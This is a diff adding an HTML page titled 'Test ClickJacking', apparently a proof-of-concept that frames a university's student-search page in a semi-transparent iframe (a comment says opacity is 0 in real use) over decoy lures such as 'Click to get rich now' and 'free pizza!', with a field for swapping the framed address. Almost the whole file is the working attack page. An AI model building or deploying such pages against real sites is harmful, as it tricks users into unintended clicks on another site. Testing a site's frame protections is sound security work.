@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<meta charset="ISO-8859-1">
+<title>Test ClickJacking</title>
+
+<style>
+iframe { /* iframe from the victim site */
+  width: 500px;
+  height: 500px;
+  position: absolute;
+  top:50px; left:-20px;
+  opacity: 0.5; /* in real opacity:0 */
+  z-index: 999;
+}
+</style>
+<script>
+$(function() {
+    $("#changeIframeButton").click(()=>{
+    	$("#iframeAddr").attr('src', $("#iframeAddrInput").val());
+    });
+});
+
+</script>
+
+</head>
+<body>
+
+<div>Click to get rich now:</div>
+
+<input id="iframeAddrInput" width="60%" type="text"></input>
+<button id="changeIframeButton" >update iframe address</button>
+<script>
+
+</script>
+<div>
+<!-- The url from the victim site -->
+<iframe id="iframeAddr" src="https://test-adi-student-alpha.app.vanderbilt.edu/student-search"></iframe>
+</div>
+<br/>
+<button>free pizza!</button>
+
+<div>...And you're cool (I'm a cool hacker actually)!</div>
+</body>
+</html>
